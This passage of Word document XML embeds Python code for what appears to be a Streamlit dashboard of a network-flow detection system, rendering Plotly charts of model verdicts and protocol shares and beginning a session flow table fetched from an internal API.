        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if by_pred:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06126845">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            order = sorted(by_pred.items(), key=lambda kv: -kv[1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E947BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            names = [k for k, _ in order]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F71441A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            vals = [v for _, v in order]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B36B9F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            colors = [SERIES[i % len(SERIES)] for i in range(len(names))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13956D62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fig = go.Figure(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC9D557">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                go.Bar(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1008F5B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    x=vals, y=names, orientation="h",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4088FFB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    marker=dict(color=colors, line=dict(color="#fcfcfb", width=2)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D76297C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    text=[money_fmt(v) for v in vals], textposition="outside",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE77C49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    hovertemplate="%{y}：%{x} 条&lt;extra&gt;&lt;/extra&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7393AC17">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D538847">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB9ED27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_layout(fig, "小模型判定分布（直接标数值）", height=300)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69493AC3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fig.update_xaxes(showgrid=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425DCC29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fig.update_yaxes(autorange="reversed")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D7D0F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.plotly_chart(fig, width="stretch", config={"displayModeBar": False})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3846F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142E98DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.info("暂无判定结果")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BC902D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D89C589">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    by_proto = stats.get("by_protocol") or {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F7EBE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if by_proto:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD28AA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        label = {"6": "TCP", "17": "UDP", "1": "ICMP"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07736C8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        names = [label.get(k, f"协议 {k}") for k in by_proto]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F57048A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        vals = list(by_proto.values())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39732C1C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fig = go.Figure(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEA7A53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            go.Bar(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC9AC91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                x=names, y=vals,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048FEACC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                marker=dict(color=[SERIES[i % len(SERIES)] for i in range(len(names))],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7921859B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                            line=dict(color="#fcfcfb", width=2)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BD0AFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                text=[money_fmt(v) for v in vals], textposition="outside",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714A0752">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                hovertemplate="%{x}：%{y} 条&lt;extra&gt;&lt;/extra&gt;",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B90E31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="426CC467">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDEEEBB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_layout(fig, "协议构成", height=260)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D15062">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.plotly_chart(fig, width="stretch", config={"displayModeBar": False})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCE34BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7422FE91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    draw_flow_table()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF2C934">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38615F06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15A140CC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PROTO_NAME = {"6": "TCP", "17": "UDP", "1": "ICMP"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A064367">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1276A675">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FAA8FE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def draw_flow_table() -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9A7005">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """会话流水表。中心只回展示用的几个特征列，78 维整包不下发（200 行会过 1 MB）。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2642B380">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    data, err = api("/api/v1/flows", limit=200, since=time.time() - minutes * 60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6032C70B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if err:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26EB2E95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.error(err)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEC8DE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAB0ACC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flows = data.get("flows") or []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D35AB7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not flows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D51F16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.info("窗口内还没有会话。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6829B362">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141CCE29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="008CC596">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E9CD78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for f in flows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769C3AF1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        proto, src_ip, src_port, dst_ip, dst_port = (f["flow_key"].split("|") + [""] * 5)[:5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8069C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dur = f["summary"].get("Flow Duration")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283E4CD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
